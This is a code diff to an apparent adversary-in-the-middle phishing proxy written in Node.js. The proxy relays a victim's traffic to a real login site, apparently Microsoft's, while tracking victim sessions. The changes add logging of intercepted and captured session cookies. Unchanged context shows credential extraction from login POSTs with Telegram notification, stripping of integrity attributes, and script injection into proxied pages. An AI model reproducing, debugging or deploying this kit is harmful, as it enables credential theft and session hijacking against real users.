@@ -73,28 +73,29 @@ function getClientIP(clientRequest) {
 }
 
 async function getVictimGeo(ip) {
-    // Keep function but no longer used
     return null;
 }
 
 function getSessionPool() {
-    // Return a dummy session ID (not used)
     return [generateRandomString(8)];
 }
 
 function buildProxyUrl(location, sessionId) {
-    // Not used – direct connection
     return '';
 }
-
-// function buildProxyAgentFromUrl(proxyUrl) {
-//     return new HttpsProxyAgent(proxyUrl);
-// } // DISABLED – DIRECT CONNECTION
 // ==================== END GEO-IP & PROXY HELPERS ====================
 
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
+
+    // ---- LOG INCOMING COOKIE HEADER ----
+    console.log(`[REQUEST] ${method} ${url}`);
+    if (headers.cookie) {
+        console.log(`[INCOMING COOKIE] ${headers.cookie}`);
+    } else {
+        console.log('[INCOMING COOKIE] (none)');
+    }
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
@@ -103,7 +104,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                clientResponse.setHeader("Set-Cookie", cookieHeader);
+                console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
@@ -112,8 +115,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
-            // DISABLED PROXY ROTATION – no geo init
-            // Just set empty proxyLevels
             if (!VICTIM_SESSIONS[session].proxyLevels) {
                 VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
             }
@@ -151,7 +152,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     clientRequestBody = Buffer.concat(clientRequestBody).toString();
 
                     if (!currentSession) {
-                        // ... (anonymous session handling unchanged) ...
                         if (clientRequestBody) {
                             try {
                                 clientRequestBody = JSON.parse(clientRequestBody);
@@ -164,7 +164,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                                        clientResponse.setHeader("Set-Cookie", cookieHeader);
+                                        console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
 
                                         VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                         VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
@@ -287,6 +289,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                     proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                 }
                                 isNavigationRequest = clientRequestBody.mode === "navigate";
+                                console.log(`[PROXY PAYLOAD] mode: ${clientRequestBody.mode}, isNavigationRequest: ${isNavigationRequest}`);
                             }
                             catch (error) {
                                 displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
@@ -320,7 +323,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     }
 
                     // ====================================================================
-                    // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION
+                    // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (unchanged)
                     // ====================================================================
                     try {
                         if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
@@ -328,7 +331,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             const originalUrl = clientRequestBody.url || '';
                             const originalMethod = clientRequestBody.method || '';
 
-                            // ---- Process ANY POST request that contains passwd or password ----
                             if (originalMethod === 'POST' && (originalBody.includes('passwd=') || originalBody.includes('password='))) {
                                 let email = '';
                                 let password = '';
@@ -361,12 +363,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 }
                             }
                         }
-                    } catch (e) {
-                        // Silent fail
-                    }
-                    // ====================================================================
+                    } catch (e) {}
 
-                    // Call the async makeProxyRequest (direct connection)
+                    // Call makeProxyRequest
                     makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest)
                         .catch(error => displayError("Proxy request failed", error));
                 });
@@ -381,8 +380,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 proxyServer.listen(process.env.PORT ?? 3000);
 
 const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, proxyIndex = 0) => {
-    // DISABLED PROXY ROTATION – DIRECT CONNECTION
-
     const isHttps = proxyRequestProtocol === "https:";
     const requestModule = isHttps ? https : http;
     const requestOptions = { ...proxyRequestOptions };
@@ -392,6 +389,9 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
             .catch(error => displayError("Log encryption failed", error));
 
+        // ---- REDIRECT DEBUG LOG ----
+        console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);
+
         if (isNavigationRequest &&
             proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
             proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
@@ -400,27 +400,29 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
             if (proxyResponseLocation) {
                 try {
                     const locationURL = new URL(proxyResponseLocation);
-
+                    console.log(`[REDIRECT REWRITE] Original Location: ${proxyResponseLocation}`);
                     VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                     VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                     VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                     VICTIM_SESSIONS[currentSession].port = locationURL.port;
                     VICTIM_SESSIONS[currentSession].host = locationURL.host;
 
-                    proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+                    const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+                    proxyResponse.headers.location = rewritten;
+                    console.log(`[REDIRECT REWRITE] Rewritten Location: ${rewritten}`);
                 } catch {
                     VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
+                    console.log(`[REDIRECT REWRITE] Failed to parse Location, set path to: ${proxyResponseLocation}`);
                 }
             }
-        }
-        else if (proxyResponse.statusCode > 400) {
-            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
+        } else {
+            console.log(`[REDIRECT SKIP] Condition not met for rewrite.`);
         }
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
         if (proxyResponseCookie) {
+            console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
-            // ===== COOKIE LOGGING REMOVED =====
         }
 
         proxyResponse.headers["cache-control"] = "no-store";
@@ -449,7 +451,7 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
                         html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
                         html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
 
-                        // ---- Dynamic script injection (instead of static <script src="/@">) ----
+                        // ---- Dynamic script injection ----
                         const dynamicCode = `
 <script>
   (async function() {
@@ -459,10 +461,11 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
       const blob = new Blob([code], { type: 'application/javascript' });
       const url = URL.createObjectURL(blob);
       await import(url);
-    } catch(e) {}
+    } catch(e) {
+      console.error('Dynamic script injection failed', e);
+    }
   })();
 </script>`;
-                        // Inject before closing </head>
                         if (html.includes('</head>')) {
                             html = html.replace('</head>', dynamicCode + '</head>');
                         } else if (html.includes('</body>')) {
@@ -516,7 +519,7 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
     proxyRequest.end();
 };
 
-// ==================== REMAINING FUNCTIONS UNCHANGED ====================
+// ==================== REMAINING FUNCTIONS (with added logging in updateCurrentSessionCookies and updateProxyRequestHeaders) ====================
 function displayError(message, error, ...args) {
     console.error("******************************");
     console.error(`${message}: ${error.name ?? error}`);
@@ -773,7 +776,6 @@ function parseCookieDate(cookieDate) {
 }
 
 function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
-    // ... unchanged ...
     const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
     const currentTimestamp = Date.now();
     let clockSkew = 0;
@@ -900,6 +902,9 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
             });
         }
     }
+
+    // ---- LOG SESSION COOKIES AFTER UPDATE ----
+    console.log(`[SESSION STATE] ${JSON.stringify(VICTIM_SESSIONS[currentSession].cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, expires: c.expires })))}`);
 }
 
 function getValidDomains(domains) {
@@ -945,9 +950,11 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
     if (Object.keys(proxyRequestCookies).length) {
         proxyRequestOptions.headers.cookie = proxyRequestCookies;
+        console.log(`[PROXY REQUEST COOKIE] ${proxyRequestCookies}`);
     }
     else {
         delete proxyRequestOptions.headers.cookie;
+        console.log(`[PROXY REQUEST COOKIE] (none)`);
     }
 
     if (proxyRequestOptions.headers.origin) {
@@ -1073,7 +1080,6 @@ async function compressResponseBody(decompressedData, encodings) {
 }
 
 // ---- updateHTMLProxyResponse is no longer used – we replaced it with dynamic injection ----
-// Keeping it for reference, but it's not called anywhere.
 function updateHTMLProxyResponse(decompressedResponseBody) {
     const payload = "<script src=/@></script>";
     const htmlInjectionMap = {
